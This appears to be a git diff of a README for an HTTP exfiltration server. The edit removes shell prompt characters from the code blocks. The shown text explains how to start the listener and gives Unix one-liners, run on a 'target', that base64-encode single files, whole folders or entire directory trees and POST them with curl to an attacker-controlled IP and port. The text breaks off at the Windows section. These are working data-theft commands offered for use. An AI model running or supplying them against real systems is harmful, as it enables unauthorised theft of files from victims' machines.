@@ -2,7 +2,7 @@
 1 - Be sure that you are running the server using bash screen or tmux, to hold it opened<br>
 2 - Run the command using Python3<br>
 ```bash
-$ python3 exfil_server-http.py -p 1337
+python3 exfil_server-http.py -p 1337
 ```
 3 - Now on the target, there are some ways to exfiltrate, based on operation system:<br>
 
@@ -10,19 +10,19 @@ $ python3 exfil_server-http.py -p 1337
 ## Unix
 - Single File
 ```bash
-$ cat file.txt | base64 -w 0 | curl -XPOST 'http://IP:PORT/post' --data-binary @-
+cat file.txt | base64 -w 0 | curl -XPOST 'http://IP:PORT/post' --data-binary @-
 ```
 
 - Multiple Files on the same folder
 ```bash
-$ ls -p | grep -v / >> files_list
-$ for x in $(cat files_list); do cat $x | base64 -w 0 | curl -XPOST 'http://IP:PORT/post' --data-binary @-; done
+ls -p | grep -v / >> files_list
+for x in $(cat files_list); do cat $x | base64 -w 0 | curl -XPOST 'http://IP:PORT/post' --data-binary @-; done
 ```
 
 - Multiple Files on all the subfolders from the current directory
 ```bash
-$ find ./ -type f >> files_list
-$ for x in $(cat files_list); do cat $x | base64 -w 0 | curl -XPOST 'http://IP:PORT/post' --data-binary @-; done
+find ./ -type f >> files_list
+for x in $(cat files_list); do cat $x | base64 -w 0 | curl -XPOST 'http://IP:PORT/post' --data-binary @-; done
 ```
 
 ## Windows
